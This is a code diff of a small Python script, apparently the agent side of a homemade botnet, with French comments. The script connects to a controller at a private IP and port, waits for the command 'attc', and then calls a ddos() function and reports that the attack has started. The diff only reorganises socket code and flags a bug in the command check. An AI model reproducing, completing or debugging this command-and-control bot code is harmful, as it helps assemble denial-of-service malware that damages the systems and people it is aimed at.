@@ -1,4 +1,4 @@
-import socket as modsocket
+import socket
 import datetime
 
 def ddos():
@@ -8,13 +8,14 @@ def ddos():
     else:
         print("error".encode("utf-8"))
 
-s = modsocket.socket(modsocket.AF_INET, modsocket.SOCK_STREAM)
 server_addr = ("192.168.56.1", 60000)
-slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 slave.connect(server_addr)
 
 attaque = (slave.recv(1024))
+
+#bug dans le if 
 if attaque == "attc":
     ddos()
     slave.send("le slave a lancé le ddos".encode("utf-8"))
